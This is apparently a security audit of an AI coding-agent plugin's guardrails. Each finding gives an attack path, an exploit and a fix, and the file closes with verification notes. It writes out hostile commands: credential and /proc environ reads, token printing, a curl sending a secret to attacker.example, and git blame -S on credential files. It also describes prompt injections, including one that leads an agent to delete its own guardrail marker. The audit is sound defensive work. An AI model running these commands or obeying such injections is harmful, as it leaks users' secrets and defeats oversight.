findings.title: Interpreter or shell given its code through /dev/stdin and a heredoc passes every guardrail profile that should refuse stdin code
findings.description: inlineInterpreterReason treats only bare '-' as stdin; '/dev/stdin','/dev/fd/0','/proc/self/fd/0' are accepted as a script file. huntProgramWhy then allows an interpreter whose script lies outside the project. The heredoc body is skipped by the tokenizer and obfuscated past the text rules. For sh/bash the same holds in QA and autopilot.
findings.attackPath: tool_input.command -> qa-guardrail text rule matches only -c/-e/-p/--eval/'-' -> analyze/tokenize skips the << body -> interpreterKind('node') -> inlineInterpreterReason returns '' for /dev/stdin -> huntProgramWhy returns '' (path outside project) -> allowed; the shell runs the heredoc body as code.
findings.exploit: Under a hunt marker a hijacked agent sends: node /dev/stdin <<'EOF' with JS that reads process.env or opens a socket, EOF. Described, never run.
findings.mitigationExamined: STDIN_WHY, the bash text rule and the hunt first-word rule all treat a path-named stdin as a normal script; no fixture covers /dev/stdin.
findings.fix: Refuse a script operand resolving to /dev/stdin, /dev/fd/*, /proc/*/fd/* or any non-regular file, and refuse <, << , <<< feeding an interpreter; in the hunt require the script realpath to be a regular file of the plugin's own preflight.

findings.title: find -delete is refused by a raw-text rule only; quoting the program name skips it and the analyzer never checks -delete
findings.description: The only find -delete rule is the grep at qa-guardrail:911 (boundary+find+whitespace...-delete). Quoted/escaped spellings ('find',"find",fi\nd) and -de''lete skip it, and the analyzer find branch handles -fprint*/-fls/-exec but not -delete. find is on HUNT_PROGRAMS.
findings.attackPath: tool_input.command -> text rule no match on quoted spelling -> tokenize normalises prog='find' -> simple() has no -delete branch -> huntProgramWhy: find listed -> allowed.
findings.exploit: fi\nd . -type f -name '*.js' -delete. Project and any writable dir deleted although the profile is read-only. Described, never run.
findings.mitigationExamined: Text rule bypassed by quoting; checkTarget never called for find operands; fixture uses only the unquoted spelling.
findings.fix: Handle -delete in the analyzer find branch (refuse in the hunt; elsewhere require start paths inside the report area), and run the program-name text rules on normalised words.

findings.category: Guardrail bypass: key material and environment read
findings.title: Key-file and /proc/*/environ rules are text regexes on the typed path; '//', '/./' and in-repo symlinks pass
findings.description: The shell key-material and environ rules match typed text; KEY_RE/checkAlias test the uncollapsed word and return before realCanonical unless an 8.3 segment is present. ~/.aws//credentials, ~/.config//gh/hosts.yml, ~/.config/./glab-cli/config.yml, ~/.docker//config.json, /proc/self/./environ pass. The file tools resolve the same paths and deny them, so the shell is weaker.
findings.attackPath: cat ~/.config//gh/hosts.yml (or tr '\0' '\n' </proc/self/./environ) -> qa-guardrail:944/949 no match -> checkAlias raw word fails KEY_RE, no SHORT_SEG, no realCanonical -> cat/tr are read programs -> allowed.
findings.exploit: A hijacked agent reads the gh/glab token file, AWS credentials or the process environment; a committed symlink docs/x -> ../../.aws/credentials needs no odd spelling. Described, never run.
findings.mitigationExamined: File-tool rules resolve real paths and are unaffected; checkAlias handles only 8.3 aliases and globs; the .aws rule lists only 'credentials'.
findings.fix: Canonicalise every path-like word (collapse // and /./, resolve .., realCanonical) before KEY_RE and the environ tests in both the bash rules and checkAlias; judge .aws/, .config/gh, .config/glab-cli, .docker/ as folders.

findings.title: Credential variables can still be printed: ${GH_TOKEN:-} parses as a dynamic word, declare -p NAME is accepted, and awk ENVIRON is not blocked
findings.description: readVar turns ${NAME:-x}, ${NAME#} into a dynamic part, so the credential test never sees the name; declare -p NAME returns early (QA/autopilot); awk is only checked for system()/pipes/getline/redirects, so ENVIRON passes in all profiles including the hunt where env/printenv/jq env are refused.
findings.attackPath: echo "${GH_TOKEN:-}" (or declare -p GH_TOKEN, or awk 'BEGIN{for(k in ENVIRON)print ENVIRON[k]}') -> text rules do not name the variables -> readVar dyn part -> credential test finds no var -> echo/awk listed -> allowed.
findings.exploit: A hijacked hunt or autopilot stage prints GH_TOKEN, ODOO_API_KEY or the whole environment into its transcript or report. Described, never run.
findings.mitigationExamined: SECRET_VARS/TRACKER_VARS and ENV_DUMP miss the expansion forms, declare -p NAME and awk ENVIRON.
findings.fix: Parse ${NAME...} by its leading identifier; treat declare/typeset/export -p NAME as an env read; refuse the token ENVIRON in awk in all profiles.

findings.title: Autopilot git sub-commands (rm, mv, add, and read commands with --output) are exempt from the protected-path rules
findings.description: In the autopilot git handler any GIT_READ_ONLY or GIT_AUTOPILOT_ALLOWED sub-command returns allowed at 1905 with no path check, skipping the --output refusal (1935) and never checking rm/mv/add operands against PROTECTED_RE/AUTOPILOT_PROTECTED_RE. The engine's end/pr steps check only repo name and branch.
findings.attackPath: autopilot profile -> git rm/mv/log -> line 1905 returns before checkTarget -> git removes/moves a protected file, or writes git log/diff/show output to --output path.
findings.exploit: git rm .github/workflows/ci.yml, git mv src/x .claude/settings.json after git add, or git log -1 --format='<text>' --output=<path outside workspace>. Described, never run.
findings.mitigationExamined: Bash rules block only push/merge/rebase/reset --hard/clean -f/checkout --/restore/stash drop; checkTarget never called for git operands; --output refused only in QA/hunt. Claude Code deny of git log/diff/show *--ou* is Claude-only and misses rm/mv.
findings.fix: Run checkTarget on every path operand of git add/rm/mv/commit and on --output for every sub-command; refuse --output in the autopilot branch too.

findings.category: Guardrail bypass: inert path controlled by the guarded agent
findings.title: The QA or hunt agent can switch the guardrail off for the rest of the session with one allowed call
findings.description: A sole command rm -f .ultrapowers/qa-active (or hunt-active) is exempt from the delete rule and confirmed by ownMarkerRemoval; the marker is the only thing that makes the hook active, so every later call is allowed. Any agent in the session, a hunter subagent included, can send it at any time. Autopilot is excluded (marker in PROTECTED_RE, ULTRAPOWERS_AUTOPILOT_INSIDE keeps headless stages guarded).
findings.attackPath: injected text -> model sends rm -f .ultrapowers/hunt-active -> sole_rm exemption -> allowed -> next call: no marker -> qa-guardrail:252 exit 0 -> inert.
findings.exploit: Prompt injection in a file the hunt reads tells the agent to remove its marker, then run denied commands. Described, never run.
findings.mitigationExamined: The marker is protected from file tools and every other shell form; only the sole-rm shape is exempt, added so a run can end. Nothing re-creates or records the removal. Contradicts the hunt design's claim (spec) that the hook holds whatever the agent decides; pressure-results.md concedes only wording protects it. After removal, Claude Code default mode still prompts for git push/tracker writes, but the scaffolded allow-list runs npm test/pytest/cargo test unprompted; auto mode or prompt-less harnesses leave nothing.
findings.fix: End the run from a step the model cannot call during the run (the skill's own script, or a human action); if the exemption stays, record the removal and keep a sidecar marker the agent cannot remove.

findings.category: Guardrail policy trusted from the audited repository
findings.title: Guardrail credential-variable exemptions come from .agents/ultrapowers.json of the repository under audit
findings.description: The hook reads qa.roles[].userEnv/passwordEnv from the working-tree .agents/ultrapowers.json with no base-ref check; a listed name is exempt from the SECRET_VARS/TRACKER_VARS test. On a contributor PR (a target the hunt skill names) echo $GH_TOKEN becomes allowed, and the value can reach the attacker's PR through the --post comment.
findings.attackPath: a PR sets qa.roles[0].passwordEnv='GH_TOKEN' -> hunt run started on that tree -> hook reads it at 352/370-374 -> a prompt-injected agent prints the token -> post-review.mjs --post comments it on the PR.
findings.exploit: A malicious contributor commits both the config change and an injection payload; the reviewer's hunt has a weaker guardrail than the maintainers configured. Described, never run.
findings.mitigationExamined: badconfig denies an unreadable file; PROTECTED_RE protects it from the agent's writes, not from audited content. The qa.hosts.allowed half does NOT apply to the hunt (it refuses all URL tools and curl/wget); QA runs only on the team's own ticket branch. So the confirmed part is the hunt credential exemption on a contributor PR, single-repo layout.
findings.fix: Read the guardrail policy from a trusted source (the base branch, a snapshot taken before checkout) and refuse a run whose audited tree changes that file.

findings.title: Windows: bare tool names (git, bash, gh, glab, claude, codex) resolve in the checked-out repository first
findings.description: The engine and preflight scripts start tools by bare name with execFile/spawnSync and no shell. On Windows libuv searches the child cwd for <name>.exe/.com before PATH. Sites: autopilot.mjs:1163 (cwd=docs repo), tracker.mjs:34, fetch-ticket.mjs:71, repos.mjs:37/64, init.mjs:506/1732/1741/1755, qa-preflight.mjs:196, hunt-preflight.mjs:328/351. hunt-preflight.mjs resolveTool (absolute PATH only) is used only for audit tools.
findings.attackPath: a Windows checkout commits claude.exe/git.exe/gh.exe/bash.exe at its root; the first ultrapowers command spawns a bare tool with cwd at the root -> libuv finds <root>/<tool>.exe first.
findings.exploit: The repo ships git.exe or claude.exe at root; the first ultrapowers call runs it as the user, inheriting GH_TOKEN/GITLAB_TOKEN/ODOO_API_KEY from the watcher. Described, never run.
findings.mitigationExamined: Prior audit item 16, partly fixed: resolveTool and NoDefaultCurrentDirectoryInExePath apply to the audit tools only (and that variable is passed to the child, not applied to Node's own search). This session's Bash env happens to have the variable set, but a Windows Scheduled-Task watcher, other harnesses and a default Windows env are not protected.
findings.fix: Resolve every tool to an absolute path from absolute PATH entries only, excluding the project root and cwd, before spawning; reuse resolveTool in a shared module.

findings.title: Approval binding and PR targets are trusted from autopilot.json, which lives in the tree a stage writes
findings.description: recheckApproval accepts the recorded approval on state.approval.docsTip == state.packet.docsTip (both from tasks/<ID>/autopilot.json) plus a matching timeline event; it does not compare the event time with the packet. planChangedSince diffs from the state file; trustState does not validate pr.docs, repos[].prUrl or report URLs, which prComment uses with the engine's credentials.
findings.attackPath: a stage overwrites tasks/<ID>/autopilot.json (via the script-file route, or git add + git mv -f which the autopilot git branch never path-checks) -> sets packet/approval docsTip to HEAD and reuses an old approve event after changing the spec/plan -> recheckApproval and planChangedSince pass -> execute and pr proceed on unapproved content; or sets prUrl/pr.docs to another PR -> postReport comments the report there with the engine's token.
findings.exploit: A prompt-injected stage forges the state file so an old approval blesses a changed plan, or the engine's token comments on a chosen PR. Described, never run.
findings.mitigationExamined: PROTECTED_RE lists tasks/<ID>/autopilot.json for file tools; the last-writer approval is checked against an unkeyed hash chain the stage can recompute; a tracked approval is not. No engine-owned copy or committed-version comparison. The engine never merges, so impact needs the opened PR/comment to be acted on by a human.
findings.fix: Keep the approval/packet binding in an engine-owned (signed or hash-pinned) file outside the stage-writable tree, verify the approve event time against packet.postedAt, and validate pr/report URLs against the forge path from the remote before any prComment.

findings.title: .agents/ultrapowers.json is read from the stage-writable tree and not snapshotted
findings.description: The marker decides mode, approvers, tickets.sources[].url (where ODOO_API_KEY is sent), repos and qa.suites[].command. The engine snapshots hooks and .mcp.json but not this file; a stage that changed it through a guardrail gap could set mode full or point the Odoo url at an attacker https host.
findings.attackPath: stage edits .agents/ultrapowers.json -> next autopilot call reads it -> Odoo rpc POST with ODOO_API_KEY to the new host, or approvers [] / mode full removes the gate.
findings.exploit: A prompt-injected stage repoints tickets.sources[].url. Described, never run.
findings.mitigationExamined: PROTECTED_RE protects the file from tool writes during a stage; odoo.mjs refuses http except loopback and refuses redirects.
findings.fix: Snapshot the marker at the first begin and read mode/approvers/sources/repos/qa from the copy, refusing a difference from the working-tree file.

findings.title: The engine's git config pins miss keys that run programs or redirect remotes
findings.description: gitArgs pins fsmonitor/sshCommand/diff.external/gitProxy/pager/hooksPath but not credential.helper, core.askPass, gpg.program, remote.<n>.uploadpack/receivepack, filter.*.clean (via a tracked .gitattributes), diff.*.textconv, url.*.insteadOf, include.path.
findings.attackPath: anything that writes .git/config or a worktree .git file -> engine git add/commit/push reads the unpinned key and runs the program with the engine's tokens.
findings.exploit: A stage-written config sets credential.helper to a command, or url.<attacker>.insteadOf. Described, never run.
findings.mitigationExamined: The guardrail protects .git/ and a .git file, and the stage env resets credential.helper, but only with stage tokens and only for the stage, not the engine's own git.
findings.fix: Run engine git with GIT_CONFIG_NOSYSTEM=1 and fixed/unset GIT_CONFIG_GLOBAL/SYSTEM, pin credential.helper/askPass/gpg.program/protocol.ext.allow, and refuse repo-local filter/textconv/uploadpack keys.

findings.title: The headless stage environment is a deny-list of named tokens
findings.description: stageEnvironment copies process.env; loadSecretsFile has already put every credential-shaped variable of .agents/mcp-secrets.env into it. Only named forge tokens and ssh vars are deleted, and only when stage tokens are set. QA role passwords, observability keys, ODOO_API_KEY and cloud keys reach a stage that reads outsider ticket text.
findings.attackPath: watch -> loadSecretsFile -> process.env -> stageEnvironment -> the harness and every tool call see the variables.
findings.exploit: A comment steers the stage into reading its environment and sending it through an allowed URL. Described, never run.
findings.mitigationExamined: The token-variable check and egress host check do not stop a variable already in the environment from being passed on.
findings.fix: Build the stage environment from an allow-list (PATH, HOME, the harness variables, the stage tokens, Odoo key only when the Odoo MCP server is used).

findings.title: A configured branch name is passed to git as a possible option (fetch, diff, log)
findings.description: startPoint runs git fetch origin <base> with base from autopilot.baseBranch/repos[].defaultBranch, no -- and no refs/heads prefix; qa-preflight.mjs and hunt-preflight.mjs use ${defaultBranch}...HEAD. A leading-dash value is read as an option.
findings.attackPath: marker defaultBranch=--upload-pack=<cmd> or --output=<path> -> runGit diff/log or git fetch reads it as an option.
findings.exploit: A committed marker sets defaultBranch to --upload-pack=<cmd> (runs for a path/file remote) or --output=<path>. Described, never run.
findings.mitigationExamined: Ticket-derived branch names are checked (isTicketBranch, check-ref-format); the base value is not validated.
findings.fix: Validate the base with git check-ref-format --branch when the marker is read, and use refs/heads/<base> or -- before positional refs.

findings.title: The Odoo mcpUrl may be plain http while the generated MCP server entry sends ODOO_API_KEY in a header
findings.description: validateTickets accepts any http/https for mcpUrl; odoo.mjs refuses http except loopback for the JSON-RPC client, but init.mjs ticketServers writes the mcpUrl as given with an Authorization header. Unchanged since the previous audit.
findings.attackPath: a committed config with http mcpUrl -> generated .mcp.json with the key header on an http URL -> harness sends the key in cleartext.
findings.exploit: Any on-path observer reads the Odoo key. Described, never run.
findings.mitigationExamined: The engine's own client enforces https; nothing checks mcpUrl for the MCP route.
findings.fix: Apply the https-or-loopback rule to mcpUrl in validateTickets and ticketServers, and refuse a key header on http.

findings.title: start-server.sh creates a predictable /tmp session directory that holds the session key
findings.description: Without --project-dir, SESSION_DIR is /tmp/brainstorm-$$-<epoch>, created with mkdir -p; state/server.log holds the server-started line with the URL, port and key.
findings.attackPath: a local user pre-creates /tmp/brainstorm-<pid>-<epoch>/state/server.log world-readable; the victim reuses it (mkdir -p) and writes the key into the attacker's file.
findings.exploit: The local user reads the key and connects to the companion on localhost. Described, never run.
findings.mitigationExamined: umask 077 protects files the script creates; the key is a per-session 256-bit value; the server binds 127.0.0.1; needs a multi-user host and a race.
findings.fix: Create the directory with mktemp -d (mode 700) or refuse if it already exists or is not owned by the current user.

findings.title: Shipped .claude/settings.json allows git blame, whose -S and --ignore-revs-file options read any file; the Read deny list for credentials is bypassed
findings.description: The allow-list has Bash(git blame:*); the deny-list blocks only 'git blame *--contents*'. git blame -S <file> (graft file) and --ignore-revs-file <file> parse an arbitrary file and echo its lines in the error. Any file the user can read (~/.git-credentials, ~/.aws/credentials, ~/.npmrc, ~/.ssh, .env) is exposed; the Read denies apply to the Read tool only, not to git.
findings.attackPath: settings.tmpl:15 Bash(git blame:*) auto-allowed -> agent runs git blame -S ~/.git-credentials -- README.md on injected instruction -> deny patterns do not match -S/--ignore-revs-file -> file lines in the tool output and model context.
findings.exploit: A hostile ticket body or file instructs the agent to run git blame with -S pointing at a credential file, then post the result. Described, never run.
findings.mitigationExamined: Only --contents, --no-index and :.env forms are denied; Bash(git blame:*) is a plain prefix match; the guardrail is inert outside a QA/hunt/autopilot run, and inside a run its line-944 rule blocks literal credential paths (but not non-canonical spellings per the key-path finding). Unseen step: how Claude Code's prefix matcher treats git blame -S <path>.
findings.fix: Drop Bash(git blame:*) or deny 'Bash(git blame *-S*)' and 'Bash(git blame *--ignore-rev*)'; allow only git blame -- <path>; add an init-suite test that probes the deny list for read-primitive options of every allowed git subcommand.

findings.title: Scaffolded settings pre-approve build and test commands that execute repository-controlled code
findings.description: Every ultrapowers:init project gets Bash(npm test:*), npm run build/lint, dotnet build/test, python -m pytest, pytest, cargo build/test, go build/test with no argument limit; these run package.json scripts, conftest.py, MSBuild targets, build.rs from the checked-out tree with no prompt.
findings.attackPath: settings.tmpl:21-31 allow -> a hostile contributor branch/PR whose scripts are malicious -> the agent runs the pre-approved npm test/pytest -> repository code runs as the developer.
findings.exploit: A PR adds a malicious test script or conftest.py; verifying the change runs it. Described, never run.
findings.mitigationExamined: The template CLAUDE.md warns and suggests removing entries; the deny list does not constrain them.
findings.fix: Ship the toolchain entries commented out and let init write them on opt-in, or require a prompt on a branch not authored by the team.

findings.title: Antigravity guardrail hook is registered with a working-directory-relative script path
findings.description: The root hooks.json command is 'node hooks/lib/guardrail-cli.mjs --antigravity', relative to cwd, while every other harness uses an absolute plugin-root variable. If Antigravity starts the hook in the workspace, a cloned repo that ships hooks/lib/guardrail-cli.mjs runs its own file, or node fails module-not-found and the guardrail may fail open.
findings.attackPath: hooks.json:10 -> Antigravity spawns with cwd=workspace (unverified) -> node resolves the cloned project's guardrail-cli.mjs, or errors and disables the guardrail.
findings.exploit: An attacker ships hooks/lib/guardrail-cli.mjs with a payload; a user opens the repo in Antigravity. Described, never run.
findings.mitigationExamined: The antigravity test resolves against the repo root, not the real launch dir; README says Antigravity behaviour is not confirmed; no fail-closed wrapper.
findings.fix: Use an absolute plugin-root path, or a launcher that locates the plugin by import.meta.url and denies when a marker exists and the guardrail cannot load. Verify the cwd on a live Antigravity.

findings.title: Scaffold does not gitignore .env/.env.local and its secret-read deny lists are partial and differ between harnesses
findings.description: The managed .gitignore ignores .agents/mcp-secrets.env and *.local.* but not .env or .env.local (*.local.* does not match .env.local); the Claude deny list names only some .env variants; the Cursor cli.json and .cursorignore omit ~/.ssh, ~/.aws and the .development/.test/.staging/.secret variants the Claude template denies; git show HEAD:<dir>/.env slips past git show *:.env*.
findings.attackPath: no .env entry -> a developer's .env is git add -A'd -> the pre-commit gitleaks scan may be skipped with a warning -> secret committed; separately the Cursor deny list lacks ~/.ssh and ~/.aws.
findings.exploit: A local .env with real keys is committed, or an agent in Cursor reads ~/.ssh/~/.aws. Described, never run.
findings.mitigationExamined: gitleaks pre-commit with default rules, the mcp-secrets.env.example convention and AGENTS.md rule 9.
findings.fix: Add .env, .env.* (with !.env.example) and .env.local to the managed gitignore; use glob denies Read(**/.env.*) and Read(**/secrets.*); align the Cursor deny list and .cursorignore with the Claude list; add git show *:*/.env* to the Claude deny list.

findings.title: Cursor deny-list template omits SSH, AWS and several .env variants that the Claude template denies
findings.description: The Cursor deny list covers .env/.env.local/.env.*.local/.env.production, gh/glab config, git credentials, netrc, npmrc, gnupg, kube and docker config, but not ~/.ssh/**, ~/.aws/**, .env.development, .env.test, .env.staging, .env.secret, which the Claude template denies. findings.attackPath: a Cursor project scaffolded by init with this template -> a prompt-injected agent reads the developer's SSH key or AWS credentials or .env.staging because Cursor's deny list does not block those paths.
findings.exploit: Injected instructions tell the agent to read the unlisted credential paths and include them in an outbound message. Described, never run.
findings.mitigationExamined: The Claude template denies those paths; the qa-guardrail is inert in ordinary Cursor sessions; AGENTS.md rule 9 expects surface parity.

findings.title: Gitleaks Docker fallback pinned by mutable tag, not digest
findings.description: When no local gitleaks binary works, the pre-commit hook runs zricethezav/gitleaks:v8.30.1 (repo mounted read-only); the same line ships in templates/.githooks/pre-commit.tmpl to every scaffolded project. The tag is not a sha256 digest.
findings.attackPath: an attacker who controls the registry tag or compromises the publisher gets code execution at commit time on a Docker-only machine.
findings.exploit: Push a malicious image under the v8.30.1 tag; developers without a local gitleaks pull and run it. Described, never run.
findings.mitigationExamined: The comment says the tag is pinned on purpose and never :latest; the mount is :ro; a local binary is preferred, so only Docker-only machines are exposed.
findings.fix: Pin to sha256 digest (zricethezav/gitleaks@sha256:<digest>) and consider --network none.

findings.title: Autopilot guardrail allows a curl GET with an indirected $VAR in the URL when qa.hosts.allowed is empty, so stage environment secrets can be sent out
findings.description: The exfiltration-shape rule blocks only $(, backtick and ${ inside a URL; a literal $NAME is caught by the secret-name analyzer rule, but one level of indirection (y=${ODOO_API_KEY:-}; curl .../$y, or declare -n r=ODOO_API_KEY) hides the name, and with qa.hosts.allowed and qa.urls empty (the scaffold default and this repo's config) no shell host check runs. Same tokenizer gap as the code-lane credential read-out finding.
findings.attackPath: an outsider issue body steers the stage -> the model runs y=${ODOO_API_KEY:-}; curl https://attacker.example/k/$y (or curl -H "X: $y" ...) -> readVar yields a nameless dynamic part, egressWhy runs only when allowedHosts has entries, line 1018 is skipped -> the shell expands the value and it leaves the host.
findings.exploit: Hide an instruction in the issue body to 'verify connectivity' with a curl to an attacker host carrying an indirected env variable. Described, never run.
findings.mitigationExamined: The literal $ODOO_API_KEY form is refused (qa-shell-writes.mjs:1281, fixture covers $GL_TOKEN); the indirect forms and the header variant pass; qa-guardrail:793-803 already denies unlisted hosts for URL-carrying tools but the shell path has no equivalent. ODOO_API_KEY and keys from mcp-secrets.env stay in the stage env.
findings.fix: In the autopilot profile treat empty qa.hosts.allowed as deny-all for curl/wget/iwr, and scrub the stage environment.

findings.title: The ready label authenticates the labeller, not the ticket body, which is fetched later and is not author-filtered; unattended scaffold, spec and plan stages read it
findings.description: labelAddedByPermitted checks only the label actor; the title/body/attachments come straight from the tracker whoever wrote them, and comments alone are author-filtered. The body is read at scaffold, after the label; on GitHub/GitLab the author can edit it afterwards, and on a public repo anyone can open the issue. Scaffold, spec and plan run bypass-permissions before the human gate. An HTML-comment route needs no edit (the maintainer does not see <!--, the model does).
findings.attackPath: an outsider opens/edits an issue -> a maintainer adds ready (the labeller is checked, not the content) -> the body is fetched at scaffold (updatedAt is never compared) and written to source.md -> scaffold/spec/plan read it with shell and write tools -> a steered model acts.
findings.exploit: Edit the issue body after the label event, or hide instructions in an HTML comment. Described, never run.
findings.mitigationExamined: source.md quotes the body, escapes <!--, caps 64KB, says it is data; the prompts say not to follow ticket text; the docs branch is pushed at the gate before any human sees the body. The only control is prompt-level. How much a steered stage can do is the other confirmed findings (curl egress, stage environment).
findings.fix: Bind the label to the content (record updatedAt or a body hash at label time; re-require the label on an edit), or require the issue author to hold write access, or show the body to the labeller in the packet before any stage reads it.

findings.title: Unattended stages inherit the full environment and run with permissions bypassed under a text-rule guardrail that does not see script files
findings.description: stageEnvironment copies all of process.env (keeping ODOO_API_KEY and every key loadSecretsFile pulled from .agents/mcp-secrets.env, deleting only named forge/ssh vars and only with stage tokens). Every stage runs bypassPermissions (Codex --dangerously-bypass-approvals-and-sandbox). The guardrail cannot see a script file: a stage writes tmp/x.mjs (allowed anywhere in the workspace) and runs node tmp/x.mjs (returns '' for a script operand), and the script reads the environment and opens connections no hook rule sees.
findings.attackPath: ticket text steers the stage -> the model writes tmp/x.mjs and runs it -> the script reads process.env and fetches an attacker URL, or posts to the tracker with a token it found.
findings.exploit: A script, or a test file that exfiltrates when the pre-approved npm test runs. Described, never run.
findings.mitigationExamined: The watcher needs read-only stage tokens or a sharedCredentials opt-in; the engine strips its forge tokens and pins git; but ODOO_API_KEY, the model-provider key and the mcp-secrets keys stay, and no OS sandbox exists. docs/autopilot-watcher.md:57,77 disclose that the hook is not a sandbox, which is a disclosure, not a control.
findings.fix: Pass an allow-listed environment and run the watcher's stages in an OS sandbox/container with network limited to the model API and the listed hosts.

findings.title: The MCP write-deny in the autopilot guardrail is a name list, the per-ticket MCP isolation is claude-code only, and Antigravity MCP calls lose their tool name
findings.description: The MCP write-deny matches only tracker names (github/gitlab/jira/linear/odoo/...); a path-less, URL-less, command-less MCP call reaches exit 0. --strict-mcp-config with a snapshot is applied for claude-code only; the watcher refuses only devin, so cursor/gemini/qwen/opencode/droid/hermes/kimi/antigravity run with their own MCP config. guardrail-cli.mjs maps Antigravity's call_mcp_tool to the constant mcp__tool, which normalises to 'tool' and skips even the Odoo/tickets tracker-write denials.
findings.attackPath: ticket text steers a stage under a non-claude-code adapter or Antigravity -> the model calls a write tool of a configured MCP server not in the tracker list, or any MCP tool through Antigravity -> the rule does not match and the call proceeds with the user's credentials.
findings.exploit: A ticket tells the agent to 'clean up' records in a connected service; the agent calls its delete/update tool. Described, never run.
findings.mitigationExamined: claude-code (this repo's harness) is isolated with a strict snapshot; codex --ignore-user-config, copilot --disable-builtin-mcps, pi --no-extensions; the tracker names are denied on all harnesses. Unseen: which MCP servers a watcher host's non-claude-code harness loads, and Antigravity's real call_mcp_tool event shape.
findings.fix: Make the MCP rule allow-list based in a stage (deny every server not in the ticket snapshot), map Antigravity's call_mcp_tool to the real server/tool before the hook sees it, and document/refuse harnesses without a strict MCP flag.

findings.title: The scaffolded .mcp.json includes remote unauthenticated MCP servers without pinning, snapshotted into every unattended stage
findings.description: microsoftdocs and deepwiki are remote http servers whose tool descriptions and results a third party controls, unpinned; the npx servers are pinned to exact versions but run with -y and resolve their dependency trees at run time; the whole list is snapshotted into each headless stage.
findings.attackPath: a compromised/changed remote server or an npm dependency of a pinned package returns a poisoned tool description/result -> it reaches an unattended stage that loaded the snapshot.
findings.exploit: A remote server's tool description is changed to include instructions; every scaffolded project loads it. Described, never run.
findings.mitigationExamined: stdio packages pinned exactly; URL-carrying tool calls are host-checked in a stage; result content is quoted data by the skills' rules. Hardening only.
findings.fix: Leave the remote documentation servers out of the autopilot snapshot and vendor the npx servers with a lockfile.

verifications.title: Interpreter or shell given its code through /dev/stdin and a heredoc passes every guardrail profile that should refuse stdin code
verifications.reason: Hunt profile: /dev/stdin passes inlineInterpreterReason (only bare '-' counts) and huntProgramWhy (any path outside the project is allowed); nothing checks a heredoc feeding an interpreter and the body is never analyzed, so the hunt program allow-list is bypassed. QA/autopilot add little (script files already allowed); node accepting /dev/stdin at runtime unverified, python does not depend on it.

verifications.title: find -delete is refused by a raw-text rule only; quoting the program name skips it and the analyzer never checks -delete
verifications.reason: The only find -delete rule is the raw-text grep at qa-guardrail:911; it misses 'find', "find", fi\nd and -de''lete. The tokenizer normalises these to find, which passes huntCheck and huntProgramWhy (on HUNT_PROGRAMS, no option check for find), and the analyzer find branch never checks -delete, so the call is allowed in the hunt and QA profiles.

verifications.title: Key-file and /proc/*/environ rules are text regexes on the typed path; '//', '/./' and in-repo symlinks pass
verifications.reason: The hook tests the lowercased raw command against literal patterns (qa-guardrail:944,949) and checkAlias tests KEY_RE on the uncollapsed word, returning before normPath/realCanonical unless an 8.3 segment is present; so ~/.config//gh/hosts.yml, /proc/self/./environ and an in-repo symlink reach cat/tr (allowed, HUNT_PROGRAMS) while the file tools resolve and deny the same paths.

verifications.title: Credential variables can still be printed: ${GH_TOKEN:-} parses as a dynamic word, declare -p NAME is accepted, and awk ENVIRON is not blocked
verifications.reason: readVar turns ${NAME<op>...} into a dyn part so the credential test never sees the name; the declare branch returns without a credential check in QA/autopilot (hunt alone refuses it); no awk rule or hook text rule refuses ENVIRON, while stageEnvironment keeps the tracker tokens. Two forms hold in the hunt (expansion, awk ENVIRON), all three in QA/autopilot.

verifications.title: Autopilot git sub-commands that take paths (rm, mv, add, and read commands with --output) are exempt from the protected-path rules
verifications.reason: qa-shell-writes.mjs:1905 allows every GIT_READ_ONLY/GIT_AUTOPILOT_ALLOWED sub-command without checkTarget, so git rm/mv of .github or .claude files and git log|diff|show --output=<any path> pass; no --output text rule, the rm rule catches only rm -r/-f, and the engine checks only repo name and branch, so a committed protected-path change is pushed. The Claude Code deny of git log/diff/show *--ou* is Claude-only and partial.

verifications.title: The QA or hunt agent can switch the guardrail off for the rest of the session with one allowed call
verifications.reason: For qa and hunt (not autopilot, excluded), a sole rm [-f] .ultrapowers/<own marker> from any agent at any point is allowed (ownMarkerRemoval) and every later call is waved through at qa-guardrail:252; this contradicts the hunt design's claim that the hook stops an injected hunter whatever it decides. After removal Claude Code default mode still prompts for push/tracker writes, but the scaffolded allow-list runs npm test/pytest/cargo test unprompted, and auto mode or prompt-less harnesses leave nothing.

verifications.title: Guardrail host lists and credential-variable exemptions come from .agents/ultrapowers.json of the repository under audit
verifications.reason: The hunt guardrail reads qa.roles from the checked-out tree with no base-ref check, and a listed name skips the SECRET_VARS/TRACKER_VARS check, so on a contributor PR (a target the hunt skill names) echo $GH_TOKEN is allowed and can reach that PR through --post. The qa.hosts.allowed half does not apply to the hunt (it refuses all URL tools and curl/wget); QA runs only on the team's own ticket branch. Single-repo layout.

verifications.title: Autopilot guardrail allows a curl GET with an indirected $VAR in the URL when qa.hosts.allowed is empty, so stage environment secrets can be sent out
verifications.reason: The literal $ODOO_API_KEY command is refused (qa-shell-writes.mjs:1281), but y=${ODOO_API_KEY:-}; curl https://host/k/$y or a declare -n reference hides the name (nameless dynamic part), and with qa.hosts.allowed and qa.urls empty no host check runs, so a plain GET carries the value to any host; the header variant works too. Unseen: the runtime environment contents, and whether a project sets qa.urls/qa.hosts.allowed.

verifications.title: The ready label authenticates the labeller, not the ticket body, which is fetched later and is not author-filtered; unattended scaffold, spec and plan stages read it
verifications.reason: labelAddedByPermitted checks only the label actor; the body is fetched live at scaffold with no author check and no comparison against an edit time or hash (updatedAt is never used), and scaffold/spec/plan run unattended with a bypass-permissions harness, shell and write tools, the docs branch pushed before any human sees it. The only control is prompt-level ('quoted data').

verifications.title: Unattended stages inherit the full environment and run with permissions bypassed under a text-rule guardrail that does not see script files
verifications.reason: A stage can write a script anywhere in the workspace and run it with node (qa-shell-writes.mjs returns '' for a script operand, and the autopilot profile is a deny-list); the script reads the environment stageEnvironment passes through, including ODOO_API_KEY and every key loadSecretsFile pulled from .agents/mcp-secrets.env, and opens connections no hook rule sees, under bypassPermissions with no sandbox. The only mitigation is a disclosure in docs/autopilot-watcher.md, not a control.

verifications.title: Approval binding and PR targets are trusted from autopilot.json, which lives in the tree a stage writes
verifications.reason: A stage can overwrite tasks/<ID>/autopilot.json despite PROTECTED_RE, by the script-file route and by git add + git mv -f (operands the autopilot git branch never checks); the engine itself calls the file stage-writable. Nothing compares it with an engine-owned or committed copy, so recheckApproval, planChangedSince and trustState accept a forged docsTip, and unvalidated prUrl/pr.docs reach tracker.prComment with the engine's credentials. The engine never merges, so impact needs a human to act on the opened PR/comment.

verifications.title: Windows: bare tool names (git, bash, gh, glab, claude, codex) resolve in the checked-out repository first
